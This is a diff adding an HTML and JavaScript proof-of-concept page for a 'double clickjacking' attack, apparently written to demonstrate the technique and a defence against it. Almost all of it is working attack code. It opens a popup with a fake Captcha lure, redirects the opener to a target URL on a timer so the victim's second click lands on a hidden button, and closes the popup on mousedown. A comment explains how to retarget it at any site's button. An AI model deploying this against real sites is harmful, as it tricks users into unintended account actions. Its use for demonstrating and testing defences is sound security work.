@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        function openDoubleWindow(url, top, left, width, height) {
+            var evilWindow = window.open(window.location.protocol+"//"+
+                window.location.hostname+":"+
+                window.location.port+"/random",
+                "_blank");
+
+            evilWindow.onload = function() {
+                evilWindow.document.open();
+
+                //plugs the page to be hijacked as opener returnee
+                evilWindow.document.write(`
+                <script>
+                setTimeout(function() {
+                    opener.location = "${url}";
+                }, 1000);
+
+                </scri`+`pt>
+
+                <html style="font-family:Arial, sans-serif;"><body style="background-color: #d0a1a1;">
+                <div style="width:600px;border: solid grey 1px;position: fixed;top:80px;left: 100px;height:200px;padding:10px;border-radius: 10px;background-color: white;">
+                    <h1>Captcha</h1>
+                    <p>Congratulations! To ensure that you are indeed a legitimate user, we kindly ask you to double-click on the link below.</p>
+                    <p>Thank you very much.</p>
+                </div>
+                <div id="doubleclick" type="button"
+                    style="cursor: pointer;top: ${top}px; left: ${left}px; width: ${width}px; height: ${height}px; position: fixed; font-size: 16px; color: white; background-color: #3498db; box-shadow: 5px 5px 10px rgba(0, 0, 0, 0.3); display: flex; justify-content: center; align-items: center; font-weight: bold; text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3); cursor: pointer; border-radius: 20px; text-align: center; padding: 0 5px;" onmouseover="this.style.backgroundColor='#2980b9'; this.style.boxShadow='6px 6px 12px rgba(0, 0, 0, 0.4)';"
+                    onmouseout="this.style.backgroundColor='#3498db';">Double Click Here</div></body></html>
+    <script>
+          document.getElementById('doubleclick').addEventListener('mousedown', function() {
+           window.close();
+           });
+           </scr`+`ipt>`);
+
+                evilWindow.document.close();
+            };
+        }
+    </script>
+</head>
+<body style='font-family:"Arial", sans-serif;background-color: #d0a1a1;'>
+
+    <h1>PoC - Demonstration page</h1>
+    <p>This page is used to demonstrate a double clickjacking attack. This page is hosted by the hacker (background red).</p>
+
+    <p>Below, you will find 2 demonstration buttons.</p>
+
+    <p>The first demonstrates a situation where the website (background blue) is not protected against double clickjacking.</p>
+
+    <p>The second, the website (background blue) is protected using the technique of disabling the button by default and/or add layer protect.</p>
+    <hr>
+    <!-- Replace value's below with the URL and top, left, width, height of a button you want to doublejack with -->
+    <input type="button" onclick="openDoubleWindow('hack.php?user=hacked@email.hack&protect=false',250, 400, 150, 30)" value="Start Demo Without Protection" style="cursor: pointer;"><br><br>
+    <input type="button" onclick="openDoubleWindow('hack.php?user=hacked@email.hack&protect=bexxo',250, 400, 150, 30)" value="Start Demo With Full Protection Website" style="cursor: pointer;">
+
+</body>
+</html>
